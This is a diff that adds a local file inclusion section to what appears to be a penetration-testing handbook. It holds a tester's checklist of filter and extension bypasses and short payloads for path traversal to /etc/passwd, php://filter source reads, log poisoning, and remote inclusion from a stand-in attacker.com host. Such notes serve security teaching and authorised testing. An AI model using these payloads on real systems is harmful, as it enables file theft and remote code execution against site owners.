@@ -1,5 +1,84 @@
 # Files
 
+## Local file inclusion
+
+### What is it?
+
+Local File Inclusion (LFI) is a vulnerability that allows an attacker to read and sometimes execute files on the victim’s system. This could lead to revealing sensitive information or even remote code execution if handled poorly by the application.
+
+**A simple example:**
+
+* A vulnerable web application may have the endpoint /page?file={filename}
+* When a request is made, the application includes the specified file into the current script.
+* If an attacker inserts a path into {filename} such as ../../../etc/passwd, they might get access to the system files.
+* The application then includes this file, and if the file contents are outputted to the response, the attacker can view sensitive system information.
+
+It's important to note that a payload or attack may change depending on the application and the server's file system. LFI can often lead to:
+
+* Sensitive data exposure
+* Remote code execution
+* Server information disclosure
+
+**Other learning resources:**
+
+* PortSwigger: [https://portswigger.net/web-security/file-path-traversal\&#x20](https://portswigger.net/web-security/file-path-traversal\&#x20);
+* PayloadsAllTheThings: [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
+
+### **Checklist**
+
+* [ ] What is the technology stack you're attacking?
+* [ ] What application/framework is being used? Is it PHP, Java, Python, .NET, etc?
+* [ ] Verify injection points
+  * [ ] URL parameters
+  * [ ] Form fields
+  * [ ] HTTP headers (e.g. cookies, etc)
+* [ ] Try to include local files /etc/passwd /boot.ini (Windows)
+* [ ] Check for file protocol handlers file:// php://filter php://input data://
+* [ ] Test for log poisoning
+* [ ] Can you inject input into log files?
+* [ ] Can you then include those log files?
+* [ ] Is there a blocklist?
+* [ ] Is there a filter?
+  * [ ] Is the filter recursive?
+  * [ ] Is the filter on single characters or sets? (e.g. `/` vs `../`)
+* [ ] Can you bypass the blocklist?
+* [ ] Is a specific extension required?
+  * [ ] Can we include a sensitive file with allowed extensions
+  * [ ] Can we bypass with null byte? %00
+* [ ] Encoding
+  * [ ] Double encoding
+  * [ ] URL encoding
+  * [ ] Unicode encoding
+* [ ] Test for remote file inclusion (RFI) Can you host a file remotely and include it?
+* [ ] Other weird bypasses
+  * [ ] ../../ in the middle of the path
+
+### Exploitation
+
+Basic file inclusion
+
+```shellscript
+../../../etc/passwd
+```
+
+Using PHP filter for base64 encoding of the file
+
+```shellscript
+php://filter/read=convert.base64-encode/resource=index.php
+```
+
+Log poisoning
+
+```shellscript
+../../../var/log/apache2/access.log
+```
+
+RFI (if allow\_url\_include is on)
+
+```
+http://attacker.com/malicious.txt
+```
+
 ## Check real file type
 
 ```bash
